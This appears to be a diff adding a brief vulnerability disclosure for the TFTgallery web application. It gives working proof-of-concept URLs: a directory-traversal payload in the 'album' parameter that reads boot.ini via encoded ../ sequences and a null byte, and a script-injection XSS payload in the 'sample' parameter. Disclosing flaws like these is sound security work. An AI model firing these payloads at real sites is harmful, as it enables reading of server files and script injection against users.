@@ -1,0 +1,12 @@
+Released information about the album parameter being vulnerable to XSS
+earlier. Seems there are other similar issues:
+
+The album parameter is vulnerable to directory transversal
+
+http://example.com/tftgallery/index.php?album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&page=1<http://192.168.1.130/tftgallery/index.php?album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini%00&page=1>
+
+The sample parameter is vulnerable to XSS
+
+http://example.com/tftgallery/settings.php?sample='></link><script>alert('blake
+XSS test')</script>&name=cucumber%20cool
+<http://192.168.1.130/tftgallery/settings.php?sample=>
